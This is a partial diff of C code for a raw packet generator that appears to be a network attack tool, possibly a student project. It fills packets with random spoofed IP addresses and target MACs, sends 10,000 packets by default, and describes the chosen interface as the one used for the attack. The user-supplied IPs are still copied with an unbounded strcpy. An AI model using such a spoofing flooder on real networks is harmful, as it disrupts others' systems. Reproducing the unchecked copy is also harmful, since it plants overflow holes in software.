@@ -54,21 +54,22 @@ void generate_ip_payload(struct ip *ip_header, char *SRC_IP, char *DST_IP) {
     ip_header->ip_v = 4; // IPv4 version
     ip_header->ip_tos = 0; // Type of Service
     ip_header->ip_len = htons(sizeof(struct ip) + 0); // Total length (in bytes)
-    ip_header->ip_id = htons(12345); // Identification
+    ip_header->ip_id = htons(rand() % 65535); // Identification
     ip_header->ip_off = 0; // Fragment offset
     ip_header->ip_ttl = 255; // Time to Live
     ip_header->ip_p = IPPROTO_TCP; // Protocol (e.g., TCP)
     ip_header->ip_sum = 0; // Checksum (initialized to 0 for calculation)
-    char ip_src[15]; 
-    if (strlen(SRC_IP) == 0) {
+    char ip_src[16]; 
+    //if (strlen(SRC_IP) == 0) {
+    if (strcmp(SRC_IP, "0") == 0) {
         generate_random_ip(ip_src);
     } else {
         strcpy(ip_src, SRC_IP);
     }
     ip_header->ip_src.s_addr = inet_addr(ip_src);
     
-    char ip_dst[15];
-    if (strlen(DST_IP) == 0) {
+    char ip_dst[16];
+    if (strcmp(DST_IP, "0") == 0) {
         generate_random_ip(ip_dst);
     } else {
         strcpy(ip_dst, DST_IP);
@@ -98,7 +99,7 @@ void generate_basic_packets(struct ether_header *packet_list, int num_packets, u
 }
 
 
-void generate_complex_packets(struct ether_header *packet_list, unsigned char **eth_frames, int num_packets, char *SRC_IP, char *DST_IP) {
+void generate_complex_packets(struct ether_header *packet_list, unsigned char **eth_frames, int num_packets, char SRC_IP[], char DST_IP[]) {
     for (int i = 0; i < num_packets; i++) {
         memcpy(eth_frames[i], &packet_list[i], ETHER_HEADER_LEN);
         
@@ -149,8 +150,8 @@ int main(int argc, char *argv[]) {
     //printf("started\n");
     int PACKET_COUNT = 10000; // default values
     char *INTERFACE = "eth0"; // default values
-    char SRC_IP[15];
-    char DST_IP[15];
+    char SRC_IP[16] = "0";
+    char DST_IP[16] = "0";
     u_char THA[ETHER_ADDR_LEN] = {0};
     // TODO : search for all the interfaces that could seem like internet but have weird names (zB  : enps) instead of fixing it to eth0 
         if (argc > 1) {
@@ -160,17 +161,21 @@ int main(int argc, char *argv[]) {
             printf("Usage: %s [options] \n", argv[0]);
             printf("Options:\n");
             printf("  -h, --help        Display this help message\n");
-            printf("  -n, --number      Number of packets to send\n");
-            printf("  -i, --interface   Interface on which to do the attack\n");
-            printf("  -s, --src         Specify source IP address\n");
-            printf("  -d, --dst         Specify destination IP address\n");
-            printf("  -e, --target      Specify taget mac address\n");
+            printf("  -n, --number      Number of packets to send (default 10000)\n");
+            printf("  -i, --interface   Interface on which to do the attack (default 'eth0')\n");
+            printf("  -s, --src         Specify source IP address (default random for each packet)\n");
+            printf("  -d, --dst         Specify destination IP address (default random for each packet)\n");
+            printf("  -e, --target      Specify taget mac address (default random for each packet)\n");
 
             return 0;
         }
         for (int i = 1; i < argc ; i++){
             if (strcmp(argv[i], "-n") == 0 || strcmp(argv[i], "--number") == 0) {
-                PACKET_COUNT = atoi(argv[i+1]);
+                if (strlen(argv[i+1]) > 4 ){
+                    printf("Don't abuse you wont need more than 10^4 packets, as I am nice i put 10000 packets, but beware of trying to buffer overflow me again !\n");
+                } else {
+				    PACKET_COUNT = atoi(argv[i+1]);
+                }
                 i++;
             } else if (strcmp(argv[i], "-i") == 0 || strcmp(argv[i], "--interface") == 0) {
                 INTERFACE = argv[i+1];
